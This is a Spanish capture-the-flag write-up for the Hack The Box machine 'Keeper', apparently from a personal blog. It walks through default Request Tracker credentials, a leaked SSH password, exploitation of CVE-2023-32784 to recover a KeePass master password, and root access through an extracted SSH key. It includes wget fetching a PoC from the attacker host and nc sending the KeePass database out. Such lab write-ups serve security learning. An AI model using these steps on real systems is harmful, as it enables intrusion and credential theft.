---
title: Keeper
description: Keeper es una máquina de dificultad fácil en Linux que presenta un sistema de gestión de tickets de soporte con credenciales por defecto. Al enumerar el servicio, se pueden encontrar credenciales en texto claro que permiten el acceso a SSH. Con acceso a SSH, se puede obtener un volcado de la base de datos de KeePass, lo cual permite recuperar la contraseña maestra. Una vez con acceso a la base de datos de KeePass, se obtienen las claves SSH de root, que permiten obtener una shell con privilegios en el host.
date: 2023-08-12
toc: true
pin: true
image:
  path: /assets/img/htb-writeup-keeper/keeper_logo.png
categories:
  - Machines
tags:
  - htb
  - linux
  - osint
  - cve
---
## Information Gathering

```terminal
/home/kali/Documents/htb/machines/keeper:-$ sudo nmap -sCV 10.10.11.227 -n -Pn -oN map1
```

![](/assets/img/htb-writeup-keeper/keeper2.png)

---
## Web Analysis & Osint

![](/assets/img/htb-writeup-keeper/keeper3.png)

```terminal
/home/kali/Documents/htb/machines/keeper:-$ echo "10.10.11.227\tkeeper.htb\ttiquets.keeper.htb" | sudo tee -a /etc/hosts
```

![](/assets/img/htb-writeup-keeper/keeper4.png)

Busco las credenciales por defecto del servicio '4.4.4+dfsg-2ubuntu1'.

<https://docs.bestpractical.com/rt/4.4.4/security.html>
>"Be sure to change the password for the 'root' user of RT. The default password is 'password'. This can be changed via the RT web interface at: Preferences > About me"

![](/assets/img/htb-writeup-keeper/keeper5.png)

Encuentro 2 usuarios registrados en el sistema. Y en el usuario 'lnorgaard' encuentro la contraseña 'Welcome2023!'.
 
![](/assets/img/htb-writeup-keeper/keeper6.png)

![](/assets/img/htb-writeup-keeper/keeper7.png)

```terminal
/home/kali/Documents/htb/machines/keeper:-$ ssh lnorgaard@10.10.11.227
lnorgaard@10.10.11.227's password: Welcome2023!
lnorgaard@keeper:~$ ls
	RT30000.zip  user.txt
```
---
## Privilege Escalation & CVE Exploitation

```terminal
lnorgaard@keeper:~$ unzip RT30000.zip
	Archive: RT30000.zip
	inflating: KeePassDumpFull.dmp
	extracting: passcodes.kdbx
```

<https://nvd.nist.gov/vuln/detail/CVE-2023-32784>

El archivo 'KeePassDumpFull.dmp' es un volcado de memoria o 'dump' de un proceso de KeePass. La Vulnerabilidad CVE-2023-32784 permite recuperar la contraseña maestra en texto claro a partir de un volcado de memoria, incluso si la base de datos de KeePass está bloqueada o el proceso de KeePass ya no está en ejecución.

Existe un Proof of Concept en github precisamente para esto.
Una vez clonado el PoC, monto un servidor para exportarlo a la maquina victima.

```terminal
/home/kali/Documents/htb/machines/keeper:-$ sudo git clone https://github.com/CMEPW/keepass-dump-masterkey.git

/home/kali/Documents/htb/machines/keeper:-$ python3 -m http.server 

lnorgaard@keeper:~$ wget http://10.10.15.26:8000/poc.py
```

Al explotar el CVE, la primera letra de la contraseña no se recupera.

```terminal
lnorgaard@keeper:~$ python3 poc.py -d KeePassDumpFull.dmp
```

![](/assets/img/htb-writeup-keeper/keeper9.png)

Realizo una busqueda del resultado '●,dgr●d med fl●d' y encuentro una palabra en danes que coincide 'rødgrød med fløde'.

Importo 'keepass.kdbx' con Netcat. E instalo Keepass para abrir el archivo anterior.

```terminal
/home/kali/Documents/htb/machines/keeper:-$ nc -nlvp 1234 > keepass.kdbx
	listening on any 1234 ...

lnorgaard@keeper:~$ nc 10.10.15.26 1234 < passcodes.kdbx
	nc 10.10.15.26 1234 < passcodes.kdbx

	... connect to [10.10.15.26] from (UNKNOWN) [10.10.11.227] 60582
	
/home/kali/Documents/htb/machines/keeper:-$ sudo apt install keepass2

/home/kali/Documents/htb/machines/keeper:-$ keepass2 keepass.kdbx
```

![](/assets/img/htb-writeup-keeper/keeper10.png)

![](/assets/img/htb-writeup-keeper/keeper11.png)

![](/assets/img/htb-writeup-keeper/keeper12.png)

 Copio y guardo la clave 'PuTTY' en un archivo '.ppk'.

```terminal
/home/kali/Documents/htb/machines/keeper:-$ echo 'PuTTY-User-Key-File-3.md: ssh-rsa Encrypt…' > key.ppk
```
Para conviertir la clave privada del archivo '.ppk' a un formato '.pem' que OpenSSH puede utilizar, descargo la herramienta Putty-Tools.

```terminal
/home/kali/Documents/htb/machines/keeper:-$ sudo apt install putty-tools 

/home/kali/Documents/htb/machines/keeper:-$ puttygen key.ppk -O private-openssh -o key.pem

/home/kali/Documents/htb/machines/keeper:-$ chmod 600 key.pem

/home/kali/Documents/htb/machines/keeper:-$ ssh -i key.pem root@10.10.11.227

root@keeper:~# cat root.txt
```
